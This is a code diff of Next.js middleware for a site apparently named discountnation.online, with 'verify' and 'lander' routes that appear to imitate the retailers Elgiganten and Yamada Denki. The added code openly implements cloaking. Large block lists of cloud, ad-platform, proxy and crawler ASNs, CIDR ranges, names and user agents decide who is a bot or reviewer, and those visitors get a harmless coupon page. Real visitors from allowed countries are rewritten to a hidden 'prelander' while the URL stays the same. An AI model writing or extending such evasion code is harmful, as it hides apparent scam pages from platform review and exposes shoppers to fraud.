@@ -2,12 +2,12 @@
 import { NextResponse, NextRequest } from "next/server";
 
 export const config = {
-  matcher: ["/elgiganten/verify/:path*", "/yamada/verify/:path*"],
+  matcher: ["/elgiganten/verify/:path*", "/yamada", "/yamada/verify/:path*", "/yamada/lander/:path*"],
 };
 
 /* ========= RUNTIME CONFIG / LOGGING ========= */
 function getRedirectUrl(pathname: string): string {
-  if (pathname.startsWith("/yamada")) return "https://www.yamada-denki.jp";
+  if (pathname.startsWith("/yamada")) return "/yamada";
   return "https://www.elgiganten.se";
 }
 const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0";
@@ -20,60 +20,69 @@ const BAD_ASN = new Set<string>([
   // Cloudflare
   "AS13335",
   // Amazon / AWS
-  "AS16509", "AS14618",
+  "AS16509", "AS14618", "AS7224", "AS8987",
   // Microsoft / Azure / Bing
-  "AS8075", "AS8068",
+  "AS8075", "AS8068", "AS8069", "AS12076",
   // Meta / Facebook
-  "AS32934",
+  "AS32934", "AS54115", "AS34825", "AS149642",
   // Fastly
   "AS54113",
   // Akamai
-  "AS20940",
+  "AS20940", "AS16625", "AS16702", "AS35994", "AS32787", "AS63949",
+  // TikTok / ByteDance
+  "AS396986", "AS138699", "AS132203",
+  // Oracle Cloud
+  "AS31898", "AS20473",
+  // DigitalOcean
+  "AS14061",
+  // Hetzner
+  "AS24940",
+  // OVH
+  "AS16276",
+  // Alibaba Cloud
+  "AS45102", "AS37963", "AS45104",
+  // Tencent Cloud
+  "AS132203", "AS45090", "AS134761",
+  // Extras
+  "AS36040", "AS19527", "AS139070", "AS36561", "AS43515", "AS16550",
+  "AS63293", "AS13443", "AS14413", "AS40793",
+  "AS19047", "AS36263", "AS12222",
+  "AS13949", "AS22859", "AS36492", "AS394089", "AS40873", "AS139190",
+  // Linode / Contabo / Leaseweb / CDN77 / M247 / Proxies / GoDaddy
+  "AS32613", "AS51167", "AS59253", "AS30633", "AS60068", "AS9009",
+  "AS396507", "AS209103", "AS208091", "AS62563",
+  // China Telecom/Unicom/Mobile
+  "AS4134", "AS4837", "AS9808", "AS17816", "AS17974",
 ]);
 
 const BAD_NAME_SNIPPETS: string[] = [
-  "google", "google llc", "google cloud", "googlebot",
-  "cloudflare", "cloudflare, inc",
-  "amazon", "aws", "amazon.com", "amazon technologies",
-  "microsoft", "azure", "bing",
-  "meta", "facebook", "facebook inc",
-  "fastly",
-  "akamai",
-  // ISP extras
-  "triple t broadband public company limited",
-  "triple t broadband",
-  "3bb",
-  "rds", "digi",
-  // "vodafone","mobifon",
-];
-
-const EXTRA_BAD_ASN: string[] = [
-  "AS15169", "AS396982", "AS36040", "AS19527", "AS139070", "AS36561", "AS43515", "AS16550",
-  "AS32934", "AS63293",
-  "AS8075", "AS8068", "AS8069", "AS12076", "AS13443", "AS14413", "AS40793",
-  "AS16509", "AS14618", "AS7224", "AS19047", "AS36263", "AS8987",
-  "AS13335",
-  "AS20940", "AS12222", "AS16625", "AS16702", "AS35994", "AS32787", "AS63949",
-  "AS54113", "AS132203",
-];
-for (const a of EXTRA_BAD_ASN) BAD_ASN.add(a.toUpperCase());
-
-const EXTRA_BAD_NAME_SNIPPETS: string[] = [
-  "google", "google llc", "google ireland limited", "google cloud",
-  "googlebot", "youtube", "ggc", "1e100.net", "googleusercontent.com", "gvt1.com", "google.com",
-  "meta", "meta platforms", "facebook", "facebook inc", "fb.com",
-  "instagram", "whatsapp", "oculus", "threads", "meta.com", "facebook.com", "instagram.com",
+  "google", "google llc", "google cloud", "google ireland limited", "googleusercontent.com",
+  "1e100.net", "gvt1.com", "google.com", "youtube", "ggc", "googlebot",
+  "meta", "meta platforms", "facebook", "facebook inc", "fb.com", "instagram", "whatsapp",
+  "oculus", "threads", "facebook.com", "instagram.com", "meta.com",
   "microsoft", "microsoft corporation", "azure", "windows.net", "bing", "msn",
-  "microsoft.com", "azure.com", "linkedin", "linkedin corporation", "linkedin.com",
-  "amazon", "amazon.com", "amazon technologies", "aws", "amazon web services",
-  "amazonaws.com", "cloudfront.net",
+  "linkedin", "linkedin corporation", "microsoft.com", "azure.com", "linkedin.com",
+  "amazon", "amazon technologies", "amazon web services", "aws", "amazonaws.com", "cloudfront.net",
   "cloudflare", "cloudflare, inc", "cloudflare.com",
   "akamai", "akamai technologies", "akamai international", "akamaiedge.net",
   "akamaitechnologies.com", "akamai.com", "prolexic",
   "fastly", "fastly, inc", "fastly.com", "fastly.net",
-  "linode", "linode, llc", "linode.com", "tencent",
+  "linode", "linode, llc", "linode.com",
+  "tiktok", "bytedance", "bytecdn", "byteoversea",
+  "digitalocean", "do-user", "digital ocean",
+  "hetzner", "hetzner online",
+  "ovh", "ovh sas", "ovhcloud",
+  "oracle", "oracle cloud", "oracle corporation",
+  "alibaba", "aliyun", "alibaba cloud",
+  "tencent", "tencent cloud", "qcloud",
+  "datacamp", "dataprovider", "m247", "choopa", "quadranet", "leaseweb",
+  "colo", "contabo", "vultr", "stackpath", "zenlayer",
+  "bright data", "luminati", "brightdata", "luminati networks",
+  "oxylabs", "smartproxy", "cdn77",
+  // ISP extras
+  "triple t broadband public company limited", "triple t broadband", "3bb",
+  "rds", "digi",
 ];
-BAD_NAME_SNIPPETS.push(...EXTRA_BAD_NAME_SNIPPETS.map((s) => s.toLowerCase()));
 
 /* ======= ENV-driven extensions ======= */
 if (process.env.BLOCKED_ASNS) {
@@ -89,10 +98,7 @@ if (process.env.BLOCKED_ISP_SUBSTRS) {
   }
 }
 
-/** Country rules
- *  - If ALLOWED_COUNTRIES (or ALLOWED_COUNTRY) is set, only those ISO codes are allowed (e.g. SE,RO)
- *  - Else, use BLOCKED_COUNTRY_CODES deny list (optional)
- */
+/** Country rules */
 const ALLOWED_COUNTRIES = new Set(
   (process.env.ALLOWED_COUNTRIES || process.env.ALLOWED_COUNTRY || "")
     .split(",")
@@ -112,21 +118,17 @@ function isBlockedByCountry(arg: { code?: string; name?: string }) {
   const name = (arg.name || "").toUpperCase();
 
   if (ALLOWED_COUNTRIES.size > 0) {
-    // prefer ISO code; simple fallback for common names
     const fallback =
       name === "SWEDEN" ? "SE" :
       name === "ROMANIA" ? "RO" :
       name === "JAPAN" ? "JP" :
+      name === "THAILAND" ? "TH" :
       "";
     const effective = code || fallback;
-
-    // If we cannot determine a country while in allow-only mode, block conservatively.
     if (!effective) return true;
-
     return !ALLOWED_COUNTRIES.has(effective);
   }
 
-  // Deny-list mode
   const candidate = code || name;
   return candidate ? BAD_COUNTRIES.has(candidate) : false;
 }
@@ -134,6 +136,47 @@ function isBlockedByCountry(arg: { code?: string; name?: string }) {
 /* ========= Bot UA detection ========= */
 const BOT_UA =
   /(bot|tencent|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;
+
+/* ========= CIDR check (ported from guard.php) ========= */
+const BAD_CIDR = [
+  "8.8.8.0/24", "8.8.4.0/24",
+  "142.250.0.0/15", "172.217.0.0/16",
+  "74.125.0.0/16", "66.249.64.0/19", "64.233.160.0/19",
+  "31.13.24.0/21", "31.13.64.0/18",
+  "66.220.144.0/20", "69.63.176.0/20", "69.171.224.0/19",
+  "157.240.0.0/17", "173.252.64.0/18", "204.15.20.0/22", "103.4.96.0/22",
+  "54.80.0.0/12", "52.0.0.0/11",
+  "206.130.0.0/16", "192.243.60.0/22",
+  "66.135.0.0/16", "199.16.156.0/22",
+  "34.64.0.0/10", "34.128.0.0/10",
+  "35.184.0.0/13", "35.192.0.0/11", "35.224.0.0/12", "35.240.0.0/13",
+  "104.196.0.0/14",
+];
+
+function ipToLong(ip: string): number {
+  const parts = ip.split(".").map(Number);
+  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
+}
+
+function isBlockedCidr(ip: string): boolean {
+  const ipLong = ipToLong(ip);
+  for (const cidr of BAD_CIDR) {
+    const [subnet, bitsStr] = cidr.split("/");
+    const bits = parseInt(bitsStr);
+    const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
+    if ((ipToLong(subnet) & mask) === (ipLong & mask)) return true;
+  }
+  return false;
+}
+
+/* ========= Header sanity (ported from guard.php) ========= */
+function hasSuspiciousHeaders(req: NextRequest): boolean {
+  const ua = req.headers.get("user-agent") || "";
+  const acceptLang = req.headers.get("accept-language") || "";
+  if (!ua) return true;
+  if (!acceptLang || acceptLang.trim().length < 2) return true;
+  return false;
+}
 
 /* ========= Helpers ========= */
 function getClientIp(req: NextRequest): string | null {
@@ -169,8 +212,8 @@ async function ipinfoLookup(ip: string, token?: string) {
       asn?: string;
       as_name?: string;
       as_domain?: string;
-      country?: string;        // e.g. "Sweden"
-      country_code?: string;   // e.g. "SE"
+      country?: string;
+      country_code?: string;
     };
     log("IPinfo response:", json);
     return json;
@@ -226,29 +269,140 @@ async function maxmindLookup(req: NextRequest, ip: string) {
   }
 }
 
+/* ========= Guard: full check (returns true if visitor should be BLOCKED) ========= */
+async function isBlocked(req: NextRequest, ip: string | null): Promise<boolean> {
+  const ua = req.headers.get("user-agent") || "";
+
+  // 1. Bot UA
+  if (BOT_UA.test(ua)) {
+    log("Guard: block by bot UA");
+    return true;
+  }
+
+  // 2. Header sanity (missing UA or Accept-Language)
+  if (hasSuspiciousHeaders(req)) {
+    log("Guard: block by suspicious headers");
+    return true;
+  }
+
+  if (!ip) {
+    log("Guard: block — no IP");
+    return true;
+  }
+
+  // 3. CIDR block (Google, Meta, AWS, etc.)
+  if (isBlockedCidr(ip)) {
+    log("Guard: block by CIDR:", ip);
+    return true;
+  }
+
+  // 4. IPinfo checks
+  const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
+
+  // 5. Provider / ASN
+  if (matchesBadProviderLite(lite)) {
+    log("Guard: block by provider");
+    return true;
+  }
+
+  // 6. Country
+  if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
+    log("Guard: block by country");
+    return true;
+  }
+  if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
+    log("Guard: block — no country while allow-only active");
+    return true;
+  }
+
+  // 7. MaxMind secondary
+  const mm = await maxmindLookup(req, ip);
+  if (mm?.isBad) {
+    log("Guard: block by MaxMind");
+    return true;
+  }
+
+  return false;
+}
+
 /* ========= Middleware ========= */
 export async function middleware(req: NextRequest) {
+  const pathname = req.nextUrl.pathname;
   const ua = req.headers.get("user-agent") || "";
   const ip = getClientIp(req);
-  const REDIRECT_URL = getRedirectUrl(req.nextUrl.pathname);
-  log("— MW START —", { path: req.nextUrl.pathname, ip, ua });
+  log("— MW START —", { path: pathname, ip, ua });
 
-  // 0) Bot UA block
+  // ──────────────────────────────────────────────────────────────────────
+  // /yamada (exact) — CLOAKING: guard decides which page to show
+  //   blocked (bot/reviewer) → NextResponse.next() → page.tsx (safe coupon page)
+  //   real user              → rewrite to /yamada/lander/ → index2.html (prelander)
+  //   URL always stays discountnation.online/yamada
+  // ──────────────────────────────────────────────────────────────────────
+  if (pathname === "/yamada" || pathname === "/yamada/") {
+    const blocked = await isBlocked(req, ip);
+    if (blocked) {
+      log("Guard → show safe page (page.tsx)");
+      return NextResponse.next();
+    }
+    log("Guard → show prelander (rewrite to /yamada/lander/)");
+    return NextResponse.rewrite(new URL("/yamada/lander/", req.url));
+  }
+
+  // ──────────────────────────────────────────────────────────────────────
+  // /yamada/verify/* and /yamada/lander/* — block bots, let real users through
+  // ──────────────────────────────────────────────────────────────────────
+  if (pathname.startsWith("/yamada/verify") || pathname.startsWith("/yamada/lander")) {
+    const REDIRECT_URL = "/yamada";
+
+    if (BOT_UA.test(ua)) {
+      log("Block bot on sub-route →", REDIRECT_URL);
+      return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
+    }
+
+    if (ip) {
+      const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
+
+      if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
+        log("Block by country on sub-route");
+        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
+      }
+      if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
+        log("Block by missing country on sub-route");
+        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
+      }
+      if (matchesBadProviderLite(lite)) {
+        log("Block by provider on sub-route");
+        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
+      }
+
+      const mm = await maxmindLookup(req, ip);
+      if (mm?.isBad) {
+        log("Block by MaxMind on sub-route");
+        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
+      }
+    }
+
+    log("Allow through sub-route");
+    return NextResponse.next();
+  }
+
+  // ──────────────────────────────────────────────────────────────────────
+  // /elgiganten/verify/* — existing logic (unchanged)
+  // ──────────────────────────────────────────────────────────────────────
+  const REDIRECT_URL = getRedirectUrl(pathname);
+
   if (BOT_UA.test(ua)) {
     log("Block by UA bot signature");
     return NextResponse.redirect(REDIRECT_URL, { status: 302 });
   }
 
-  // 1) IPinfo checks (country + ASN/name)
   if (ip) {
     const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
 
-    // Country rule (allow-only if ALLOWED_COUNTRIES set, else deny-list)
     if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
       log("Block by country:", { code: (lite as any).country_code, name: lite.country });
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
     }
-    // If allow-only mode and IPinfo gave no country at all, block conservatively
     if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
       log("Block by country: missing code while allow-only active");
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
@@ -259,17 +413,13 @@ export async function middleware(req: NextRequest) {
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
     }
 
-    // 2) MaxMind secondary signal
     const mm = await maxmindLookup(req, ip);
     if (mm?.isBad) {
       log("Redirect (MaxMind match) →", REDIRECT_URL);
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
     }
-  } else {
-    log("No client IP found; skipping IP-based checks");
   }
 
-  // 3) Allow through
   log("Allow through");
   return NextResponse.next();
 }
